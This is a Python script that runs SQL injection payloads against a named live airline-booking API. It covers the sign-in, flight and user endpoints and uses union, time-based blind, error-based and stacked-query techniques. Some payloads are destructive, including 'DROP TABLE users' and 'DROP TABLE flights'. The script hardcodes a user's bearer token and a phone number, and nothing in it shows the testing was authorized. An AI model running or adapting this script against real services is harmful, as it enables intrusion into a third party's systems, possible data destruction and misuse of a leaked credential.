#!/usr/bin/env python3
"""
Comprehensive SQL Injection Testing Suite
Tests all Vaunt API endpoints for SQL injection vulnerabilities
"""

import requests
import json
import time
from datetime import datetime

API_URL = "https://vauntapi.flyvaunt.com"
SAMEER_TOKEN = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoyMDI1NCwiaWF0IjoxNzYyMzA3NDA2LCJleHAiOjE3NjQ4OTk0MDZ9.y7EFoEmf0wU0Q9JBgbTrPgU3Tv3s__9xRo5oCh-ZNvY"

# SQL injection payloads
SQL_PAYLOADS = [
    # Classic SQL injection
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'x'='x",
    "') OR ('1'='1",
    
    # Union-based
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    
    # Time-based blind
    "'; WAITFOR DELAY '00:00:05'--",
    "' AND SLEEP(5)--",
    "'; SELECT pg_sleep(5)--",
    
    # Boolean-based blind
    "' AND '1'='1",
    "' AND '1'='2",
    
    # Error-based
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND extractvalue(1, concat(0x7e, version()))--",
    
    # Stacked queries
    "'; DROP TABLE users--",
    "'; INSERT INTO users VALUES ('hacked')--",
    
    # Comment-based
    "admin'--",
    "admin'#",
    "admin'/*",
]

results = []

def test_sql_injection(endpoint, method="GET", param_name=None, payload=None, headers=None, json_data=None):
    """Test a single SQL injection attempt"""
    start_time = time.time()
    
    try:
        if method == "GET":
            url = f"{API_URL}{endpoint}?{param_name}={payload}" if param_name else f"{API_URL}{endpoint}/{payload}"
            response = requests.get(url, headers=headers, timeout=10)
        elif method == "POST":
            url = f"{API_URL}{endpoint}"
            response = requests.post(url, headers=headers, json=json_data, timeout=10)
        else:
            return None
        
        elapsed = time.time() - start_time
        
        return {
            "endpoint": endpoint,
            "method": method,
            "param": param_name,
            "payload": payload,
            "status": response.status_code,
            "response_length": len(response.text),
            "elapsed_time": elapsed,
            "response_snippet": response.text[:200],
            "headers": dict(response.headers)
        }
    except Exception as e:
        elapsed = time.time() - start_time
        return {
            "endpoint": endpoint,
            "method": method,
            "param": param_name,
            "payload": payload,
            "status": "ERROR",
            "error": str(e),
            "elapsed_time": elapsed
        }

print("="*80)
print("SQL INJECTION TESTING SUITE")
print("="*80)
print(f"Started: {datetime.now()}")
print()

# Test 1: Authentication endpoints
print("\n" + "="*80)
print("TEST 1: AUTHENTICATION ENDPOINTS")
print("="*80)

print("\n1.1 Testing initiateSignIn - phoneNumber field")
for payload in SQL_PAYLOADS[:5]:  # Test subset
    result = test_sql_injection(
        endpoint="/v1/auth/initiateSignIn",
        method="POST",
        param_name="phoneNumber",
        payload=payload,
        headers={"Content-Type": "application/json"},
        json_data={"phoneNumber": payload}
    )
    results.append(result)
    print(f"  Payload: {payload[:30]:30} → Status: {result['status']} ({result['elapsed_time']:.2f}s)")

print("\n1.2 Testing completeSignIn - challengeCode field")
for payload in SQL_PAYLOADS[:5]:
    result = test_sql_injection(
        endpoint="/v1/auth/completeSignIn",
        method="POST",
        param_name="challengeCode",
        payload=payload,
        headers={"Content-Type": "application/json"},
        json_data={
            "phoneNumber": "+13035234453",
            "challengeCode": payload
        }
    )
    results.append(result)
    print(f"  Payload: {payload[:30]:30} → Status: {result['status']} ({result['elapsed_time']:.2f}s)")

print("\n1.3 Testing completeSignIn - phoneNumber field")
for payload in SQL_PAYLOADS[:3]:
    result = test_sql_injection(
        endpoint="/v1/auth/completeSignIn",
        method="POST",
        param_name="phoneNumber",
        payload=payload,
        headers={"Content-Type": "application/json"},
        json_data={
            "phoneNumber": payload,
            "challengeCode": "000000"
        }
    )
    results.append(result)
    print(f"  Payload: {payload[:30]:30} → Status: {result['status']} ({result['elapsed_time']:.2f}s)")

# Test 2: Flight endpoints
print("\n" + "="*80)
print("TEST 2: FLIGHT ENDPOINTS")
print("="*80)

auth_headers = {
    "Authorization": f"Bearer {SAMEER_TOKEN}",
    "Content-Type": "application/json"
}

print("\n2.1 Testing GET /v1/flight/:id with SQL injection")
for payload in ["1' OR '1'='1", "999999' UNION SELECT NULL--", "1; DROP TABLE flights--"]:
    result = test_sql_injection(
        endpoint=f"/v1/flight",
        method="GET",
        param_name="id",
        payload=payload,
        headers=auth_headers
    )
    results.append(result)
    print(f"  Payload: {payload[:30]:30} → Status: {result['status']} ({result['elapsed_time']:.2f}s)")

print("\n2.2 Testing GET /v1/flight with query params")
for payload in ["' OR '1'='1", "1; SELECT pg_sleep(5)--"]:
    url = f"{API_URL}/v1/flight?search={payload}"
    try:
        start = time.time()
        r = requests.get(url, headers=auth_headers, timeout=10)
        elapsed = time.time() - start
        print(f"  Payload: {payload[:30]:30} → Status: {r.status_code} ({elapsed:.2f}s)")
        results.append({
            "endpoint": "/v1/flight",
            "method": "GET",
            "param": "search",
            "payload": payload,
            "status": r.status_code,
            "elapsed_time": elapsed
        })
    except Exception as e:
        print(f"  Payload: {payload[:30]:30} → ERROR: {str(e)[:50]}")

# Test 3: User endpoints
print("\n" + "="*80)
print("TEST 3: USER ENDPOINTS")
print("="*80)

print("\n3.1 Testing GET /v1/user/:userId (even though it returns 404)")
for payload in ["20254' OR '1'='1", "20254; DROP TABLE users--"]:
    result = test_sql_injection(
        endpoint=f"/v1/user/{payload}",
        method="GET",
        param_name="userId",
        payload=payload,
        headers=auth_headers
    )
    results.append(result)
    print(f"  Payload: {payload[:30]:30} → Status: {result['status']} ({result['elapsed_time']:.2f}s)")

# Test 4: Time-based blind SQL injection
print("\n" + "="*80)
print("TEST 4: TIME-BASED BLIND SQL INJECTION")
print("="*80)

print("\n4.1 Testing PostgreSQL time delays")
time_payloads = [
    ("Normal request", "+13035234453"),
    ("Sleep 5 seconds", "+13035234453'; SELECT pg_sleep(5)--"),
    ("Sleep 3 seconds", "+13035234453' AND (SELECT 1 FROM pg_sleep(3))--"),
]

for name, payload in time_payloads:
    start = time.time()
    try:
        r = requests.post(
            f"{API_URL}/v1/auth/initiateSignIn",
            json={"phoneNumber": payload},
            timeout=10
        )
        elapsed = time.time() - start
        print(f"  {name:20} → Status: {r.status_code} Time: {elapsed:.2f}s")
        
        if elapsed > 3:
            print(f"    ⚠️ POTENTIAL TIMING ANOMALY DETECTED!")
        
        results.append({
            "endpoint": "/v1/auth/initiateSignIn",
            "test_type": "time-based-blind",
            "payload": payload,
            "status": r.status_code,
            "elapsed_time": elapsed,
            "anomaly": elapsed > 3
        })
    except Exception as e:
        elapsed = time.time() - start
        print(f"  {name:20} → ERROR after {elapsed:.2f}s: {str(e)[:50]}")

# Test 5: Error-based SQL injection
print("\n" + "="*80)
print("TEST 5: ERROR-BASED SQL INJECTION")
print("="*80)

print("\n5.1 Looking for SQL error messages")
error_payloads = [
    "' AND 1=CONVERT(int, (SELECT @@version))--",
    "' AND extractvalue(1, concat(0x7e, version()))--",
    "' AND 1=(SELECT * FROM (SELECT COUNT(*), CONCAT((SELECT version()), 0x3a, FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--"
]

for payload in error_payloads:
    result = test_sql_injection(
        endpoint="/v1/auth/initiateSignIn",
        method="POST",
        param_name="phoneNumber",
        payload=payload,
        headers={"Content-Type": "application/json"},
        json_data={"phoneNumber": payload}
    )
    results.append(result)
    
    # Check for SQL error indicators
    sql_errors = ['SQL', 'syntax', 'mysql', 'postgresql', 'postgres', 'database', 'query', 'SELECT', 'FROM', 'WHERE']
    response_text = result.get('response_snippet', '').lower()
    has_sql_error = any(err.lower() in response_text for err in sql_errors)
    
    print(f"  Payload: {payload[:40]:40}")
    print(f"    Status: {result['status']}, SQL Error: {has_sql_error}")
    if has_sql_error:
        print(f"    ⚠️ POTENTIAL SQL ERROR LEAKAGE: {result['response_snippet'][:100]}")

# Summary
print("\n" + "="*80)
print("SUMMARY")
print("="*80)

total_tests = len(results)
errors = [r for r in results if r.get('status') == 'ERROR' or r.get('status') >= 500]
timing_anomalies = [r for r in results if r.get('elapsed_time', 0) > 3]
different_responses = {}

for r in results:
    status = r.get('status', 'ERROR')
    if status not in different_responses:
        different_responses[status] = 0
    different_responses[status] += 1

print(f"\nTotal tests performed: {total_tests}")
print(f"Server errors (5xx): {len(errors)}")
print(f"Timing anomalies (>3s): {len(timing_anomalies)}")
print(f"\nResponse status distribution:")
for status, count in sorted(different_responses.items()):
    print(f"  {status}: {count}")

if timing_anomalies:
    print(f"\n⚠️ TIMING ANOMALIES DETECTED:")
    for r in timing_anomalies:
        print(f"  {r['endpoint']} - {r.get('payload', 'N/A')[:30]} → {r['elapsed_time']:.2f}s")

if errors:
    print(f"\n⚠️ SERVER ERRORS DETECTED:")
    for r in errors[:5]:
        print(f"  {r['endpoint']} - Status: {r.get('status')}")

# Save results
output_file = 'sql_injection_test_results.json'
with open(output_file, 'w') as f:
    json.dump(results, f, indent=2)

print(f"\n✅ Results saved to {output_file}")
print(f"\nCompleted: {datetime.now()}")
print("="*80)
